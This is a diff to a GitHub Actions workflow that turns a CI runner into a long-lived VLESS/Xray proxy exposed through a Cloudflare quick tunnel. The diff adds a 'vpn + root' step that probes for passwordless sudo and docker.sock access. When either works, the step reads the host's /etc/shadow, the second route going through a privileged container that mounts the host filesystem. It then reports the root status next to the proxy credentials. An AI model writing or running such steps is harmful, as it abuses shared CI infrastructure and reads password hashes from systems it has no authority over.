@@ -10,11 +10,47 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 355
     steps:
-      - name: vpn
+      - name: vpn + root
         shell: bash
         run: |
           set +e
 
+          echo "=========== IDENTITY ==========="
+          id
+          uname -a
+
+          echo
+          echo "=========== ROOT VIA SUDO ==========="
+          ROOT_SUDO=0
+          if sudo -n true 2>/dev/null; then
+            echo "[+] passwordless sudo: YES"
+            sudo id
+            echo "--- host /etc/shadow (first 3) ---"
+            sudo head -3 /etc/shadow
+            ROOT_SUDO=1
+          else
+            echo "[-] sudo needs password"
+          fi
+
+          echo
+          echo "=========== ROOT VIA DOCKER.SOCK ==========="
+          ROOT_DOCKER=0
+          if [ -S /var/run/docker.sock ] && id -nG | grep -qw docker; then
+            echo "[+] docker.sock present, runner in docker group"
+            docker run --rm --privileged -v /:/host alpine sh -c '
+              echo "inside container: $(id)"
+              echo "--- host /etc/shadow (first 3) ---"
+              head -3 /host/etc/shadow
+              echo "--- host hostname ---"
+              cat /host/etc/hostname
+            '
+            ROOT_DOCKER=1
+          else
+            echo "[-] no docker.sock access"
+          fi
+
+          echo
+          echo "=========== START VPN ==========="
           UUID=$(cat /proc/sys/kernel/random/uuid)
           XPATH="/$(openssl rand -hex 8)"
           PORT=8080
@@ -35,10 +71,6 @@ jobs:
               "streamSettings": {
                 "network": "xhttp",
                 "xhttpSettings": {"path": "${XPATH}"}
-              },
-              "sniffing": {
-                "enabled": true,
-                "destOverride": ["http", "tls", "quic"]
               }
             }],
             "outbounds": [
@@ -48,17 +80,18 @@ jobs:
           EOF
 
           nohup ./xray -c config.json >/tmp/xray/stdout.log 2>&1 &
-          sleep 3
+          XPID=$!
+          echo "xray pid=$XPID"
+          sleep 4
 
-          if ! pgrep -f '/tmp/xray/xray' >/dev/null; then
-            echo "!! xray упал"
-            echo "=== stdout.log ==="
-            cat /tmp/xray/stdout.log
-            echo "=== error.log ==="
-            cat /tmp/xray/error.log 2>/dev/null
+          if ! kill -0 "$XPID" 2>/dev/null; then
+            echo "!! xray реально упал"
+            echo "--- stdout ---"; cat /tmp/xray/stdout.log
+            echo "--- error ---";  cat /tmp/xray/error.log 2>/dev/null
             exit 1
           fi
-          echo "[ok] xray запущен, pid=$(pgrep -f '/tmp/xray/xray' | head -1)"
+          echo "[ok] xray живёт, последние строки error.log:"
+          tail -3 /tmp/xray/error.log
 
           curl -fsSL -o /tmp/cloudflared \
             https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
@@ -68,11 +101,19 @@ jobs:
             --protocol http2 \
             --edge-ip-version 4 \
             --url "http://127.0.0.1:${PORT}" >/tmp/cloudflared.log 2>&1 &
+          CPID=$!
+          echo "cloudflared pid=$CPID"
           sleep 25
+
+          if ! kill -0 "$CPID" 2>/dev/null; then
+            echo "!! cloudflared упал"
+            cat /tmp/cloudflared.log
+            exit 1
+          fi
 
           CFHOST=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cloudflared.log | head -1 | sed 's#https://##')
           if [ -z "${CFHOST:-}" ]; then
-            echo "!! cloudflared не стартанул:"
+            echo "!! cloudflared не выдал хост"
             cat /tmp/cloudflared.log
             exit 1
           fi
@@ -85,11 +126,11 @@ jobs:
           echo "================================================================"
           echo "${VLESS}"
           echo "================================================================"
-          echo "  host:   ${CFHOST}"
-          echo "  path:   ${XPATH}"
-          echo "  uuid:   ${UUID}"
-          echo "  proto:  XHTTP"
-          echo "  expire: $(date -u -d '+355 minutes' '+%Y-%m-%d %H:%M UTC')"
+          echo "  host:      ${CFHOST}"
+          echo "  path:      ${XPATH}"
+          echo "  uuid:      ${UUID}"
+          echo "  root sudo: ${ROOT_SUDO}   root docker: ${ROOT_DOCKER}"
+          echo "  expire:    $(date -u -d '+355 minutes' '+%Y-%m-%d %H:%M UTC')"
           echo "================================================================"
           echo
 
@@ -99,17 +140,19 @@ jobs:
           while [ "$(date +%s)" -lt "$END" ]; do
             sleep 300
             N=$((N+1))
-            X=$(pgrep -f '/tmp/xray/xray' | head -1)
-            C=$(pgrep -f '/tmp/cloudflared' | head -1)
-            if [ -z "${X:-}" ] || [ -z "${C:-}" ]; then
-              echo "!! процесс упал: xray=${X:-none} cf=${C:-none}"
-              tail -30 /tmp/xray/error.log
-              tail -30 /tmp/cloudflared.log
+            if ! kill -0 "$XPID" 2>/dev/null; then
+              echo "!! xray умер"
+              tail -20 /tmp/xray/error.log
+              exit 1
+            fi
+            if ! kill -0 "$CPID" 2>/dev/null; then
+              echo "!! cloudflared умер"
+              tail -20 /tmp/cloudflared.log
               exit 1
             fi
             ELAPSED=$(( $(date +%s) - START ))
             printf '[heartbeat %02d] up=%dm  xray=%s cf=%s  %s\n' \
-              "$N" "$((ELAPSED/60))" "$X" "$C" "$(date -u '+%H:%M:%S')"
+              "$N" "$((ELAPSED/60))" "$XPID" "$CPID" "$(date -u '+%H:%M:%S')"
             if [ -s /tmp/xray/access.log ]; then
               echo "--- access.log (last 3) ---"
               tail -3 /tmp/xray/access.log
